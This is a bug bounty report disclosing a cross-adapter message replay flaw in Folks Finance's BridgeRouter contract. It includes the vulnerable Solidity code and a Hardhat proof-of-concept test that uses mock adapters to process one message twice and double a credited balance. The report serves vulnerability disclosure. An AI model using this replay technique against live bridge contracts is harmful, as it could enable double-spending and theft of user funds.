# Boost \_ Folks Finance 33376 - \[Smart Contract - Insight] BridgeRouterreceiveMessage Allows Message R

Submitted on Thu Jul 18 2024 22:03:59 GMT-0400 (Atlantic Standard Time) by @chista0x for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33376

Report type: Smart Contract

Report severity: Insight

Target: <https://testnet.snowtrace.io/address/0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `BridgeRouter` contract allows for message replay across different adapters, contrary to its intended design as described in the project's documentation. This vulnerability arises because the `seenMessages` mapping is keyed by both `adapterId` and `messageId`, rather than just `messageId`. As a result, a message with the same `messageId` can be successfully replayed if sent through a different adapter.

## Vulnerability Details:

The `BridgeRouter` contract is designed to prevent replay attacks by tracking messages that have already been processed. According to the project's documentation, the implementation should prevent the same message from being replayed across different adapters:

```
The interface IBridgeAdapter specifies the implementation needed of a GMP for it to be callable by BridgeRouter. Each GMP will have its own adapter specific to its needs. A GMP may have multiple adapters to support various functionality such as sending data alone or sending data + token.
```

```
You may ask, why don’t we don’t do the same in the individual adapters as opposed to in the BridgeRouter? The reason is because a GMP may have multiple adapters so an attack vector could be to replay the same message but to different adapters. Therefore we need a global storage of all messages received on a given chain.
```

However, the current implementation only prevents replay attacks within the same adapter. The relevant code snippet from `BridgeRouter` is:

contracts\bridge\BridgeRouter.sol

```solidity
abstract contract BridgeRouter is IBridgeRouter, AccessControlDefaultAdminRules {

    ...

    mapping(uint16 adapterId => mapping(bytes32 messageId => bool hasBeenSeen)) public seenMessages;

    ...

    function receiveMessage(Messages.MessageReceived memory message) external payable override {
        // check if caller is valid adapter
        IBridgeAdapter adapter = IBridgeAdapter(msg.sender);
        uint16 adapterId = adapterToId[adapter];
        if (!isAdapterInitialized(adapterId)) revert AdapterUnknown(adapter);

        // check if haven't seen message
        if (seenMessages[adapterId][message.messageId]) revert MessageAlreadySeen(message.messageId);  // --------- this line

        // convert handler to address type (from lower 20 bytes)
        address handler = Messages.convertGenericAddressToEVMAddress(message.handler);

        // add msg.value to user balance if present
        if (msg.value > 0) {
            bytes32 userId = _getUserId(Messages.decodeActionPayload(message.payload));
            balances[userId] += msg.value;
        }

        // store message as seen before call to handler
        seenMessages[adapterId][message.messageId] = true;

        // call handler with received payload
        try BridgeMessenger(handler).receiveMessage(message) {
            // emit message received as suceeded
            emit MessageSucceeded(adapterId, message.messageId);
        } catch (bytes memory err) {
            // don't revert so GMP doesn't revert
            // store and emit message received as failed
            failedMessages[adapterId][message.messageId] = message;
            emit MessageFailed(adapterId, message.messageId, err);
        }
    }
}
```

Furthermore, the project's test suite includes a test that checks for replay attacks within a single adapter but does not test for replay attacks across different adapters:

test\bridge\BridgeRouter.test.ts

```javascript
    it("Should fail to receive message when message already seen", async () => {
      const { unusedUsers, bridgeRouter, adapter, adapterAddress, bridgeMessengerAddress } =
        await loadFixture(deployBridgeMessengerFixture);
      const sender = unusedUsers[0];

      const message: MessageReceived = {
        messageId: getRandomBytes(BYTES32_LENGTH),
        sourceChainId: BigInt(0),
        sourceAddress: convertEVMAddressToGenericAddress(adapterAddress),
        handler: convertEVMAddressToGenericAddress(bridgeMessengerAddress),
        payload: buildMessagePayload(0, accountId, sender.address, "0x"),
        returnAdapterId: BigInt(0),
        returnGasLimit: BigInt(0),
      };

      // receive message twice
      await adapter.receiveMessage(message);
      const receiveMessage = adapter.receiveMessage(message);
      await expect(receiveMessage)
        .to.be.revertedWithCustomError(bridgeRouter, "MessageAlreadySeen")
        .withArgs(message.messageId);
    });
```

## Impact Details

The incorrect implementation allows attackers to replay the same message across different adapters. This can lead to various attacks such as double spending or triggering unintended actions multiple times. This vulnerability poses a significant risk to the protocol's integrity and could lead to financial losses or other malicious activities.

## References

BridgeRouter.sol: <https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/bridge/BridgeRouter.sol#L94>

## Proof of concept

## Proof of Concept

Add the following codes to the test file `test\bridge\BridgeRouter.test.ts` to demonstrate the vulnerability:

```javascript
  async function add2AdapterFixture() {
    const { admin, messager, unusedUsers, bridgeRouter, bridgeRouterAddress } =
      await loadFixture(deployBridgeRouterFixture);

    // deploy and add adapter
    const adapter = await new MockAdapter__factory(admin).deploy(bridgeRouterAddress);
    const adapter2 = await new MockAdapter__factory(admin).deploy(bridgeRouterAddress);
    const adapterId = 0;
    const adapterId2 = 1;
    const adapterAddress = await adapter.getAddress();
    const adapterAddress2 = await adapter2.getAddress();
    await bridgeRouter.connect(admin).addAdapter(adapterId, adapterAddress);
    await bridgeRouter.connect(admin).addAdapter(adapterId2, adapterAddress2);

    return {
      admin,
      messager,
      unusedUsers,
      bridgeRouter,
      bridgeRouterAddress,
      adapter,
      adapter2,
      adapterId,
      adapterId2,
      adapterAddress,
    };
  }

```

```javascript
  async function deployBridgeMessenger2AdapterFixture() {
    const { admin, messager, unusedUsers, bridgeRouter, bridgeRouterAddress, adapter,adapter2, adapterId,adapterId2, adapterAddress } =
      await loadFixture(add2AdapterFixture);

    // deploy messenger and sender
    const bridgeMessenger = await new BridgeMessengerReceiver__factory(admin).deploy(bridgeRouter);

    // common params
    const bridgeMessengerAddress = await bridgeMessenger.getAddress();

    return {
      admin,
      messager,
      unusedUsers,
      bridgeRouter,
      bridgeRouterAddress,
      adapter,
      adapter2,
      adapterId,
      adapterId2,
      adapterAddress,
      bridgeMessenger,
      bridgeMessengerAddress,
    };
  }
```

```javascript
  describe("Chista0x-Replay Same Message to two adapter", () => {
 
    it("should allow the same message to be processed by different adapters", async () => {
      const { unusedUsers, bridgeRouter, adapter,adapter2,adapterId,adapterId2, adapterAddress, bridgeMessenger,bridgeMessengerAddress } =
        await loadFixture(deployBridgeMessenger2AdapterFixture);
      const sender = unusedUsers[0];

      // balance before
      const bridgeRouterBalance = await ethers.provider.getBalance(bridgeRouter);

      const message: MessageReceived = {
        messageId: getRandomBytes(BYTES32_LENGTH),
        sourceChainId: BigInt(0),
        sourceAddress: convertEVMAddressToGenericAddress(adapterAddress),
        handler: convertEVMAddressToGenericAddress(bridgeMessengerAddress),
        payload: buildMessagePayload(0, accountId, sender.address, "0x"),
        returnAdapterId: BigInt(0),
        returnGasLimit: BigInt(0),
      };

      const balance = BigInt(30000);
      // receive `same` message twice from two different adapter
      const receiveMessage = await adapter.receiveMessage(message, { value: balance });
      const receiveMessage2 = await adapter2.receiveMessage(message, { value: balance });


      await expect(receiveMessage).to.emit(adapter, "ReceiveMessage").withArgs(message.messageId);
      await expect(receiveMessage).to.emit(bridgeMessenger, "ReceiveMessage").withArgs(message.messageId);
      await expect(receiveMessage).to.emit(bridgeRouter, "MessageSucceeded").withArgs(adapterId, message.messageId);
      expect(await bridgeRouter.seenMessages(adapterId, message.messageId)).to.be.true;

      await expect(receiveMessage2).to.emit(adapter2, "ReceiveMessage").withArgs(message.messageId);
      await expect(receiveMessage2).to.emit(bridgeMessenger, "ReceiveMessage").withArgs(message.messageId);
      await expect(receiveMessage2).to.emit(bridgeRouter, "MessageSucceeded").withArgs(adapterId2, message.messageId);
      expect(await bridgeRouter.seenMessages(adapterId2, message.messageId)).to.be.true;


      expect(await bridgeRouter.balances(accountId)).to.be.equal(balance + balance);
      expect(await ethers.provider.getBalance(bridgeRouter)).to.be.equal(bridgeRouterBalance + balance + balance);

    });

  });
```

Run the test with the command `npx hardhat test --grep "Chista0x-Replay"`

Test output:

```
  BridgeRouter (unit tests)
    Chista0x-Replay Same Message to two adapter
      ✔ should allow the same message to be processed by different adapters (3494ms)


  1 passing (4s)
```
